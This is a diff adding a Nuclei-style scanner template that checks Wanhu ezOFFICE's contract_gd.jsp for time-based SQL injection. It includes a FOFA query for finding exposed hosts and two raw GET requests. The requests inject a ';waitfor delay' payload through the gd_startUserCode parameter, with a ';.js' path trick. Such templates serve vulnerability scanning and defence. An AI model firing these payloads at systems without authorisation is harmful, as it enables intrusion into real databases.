@@ -1,0 +1,23 @@
+id: ezoffice-sql-injection
+info:
+  name: "万户 ezOFFICE contract_gd.jsp 组件 SQL 注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="万户网络-ezOFFICE"
+          万户 ezOFFICE系统contract_gd.jsp组件存在SQL注入安全缺陷，攻击者可通过构造特制的SQL请求利用该漏洞，导致数据库敏感数据泄露或篡改。该漏洞允许未经授权的数据库操作，可能引发数据完整性破坏或机密性泄露风险。
+  tags: 万户
+http:
+- raw:
+  - |
+    GET /defaultroot/modules/subsidiary/contract/contract_gd.jsp;.js?gd=1&gd_startUserCode=1%27%3Bwaitfor%20delay%20%270%3A0%3A5%27-- HTTP/1.1
+    Host: {{Hostname}}
+  - |
+    GET /defaultroot/modules/subsidiary/contract/contract_gd.jsp;.js?gd=1&gd_startUserCode=1%27%3Bwaitfor%20delay%20%270%3A0%3A8%27-- HTTP/1.1
+    Host: {{Hostname}}
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
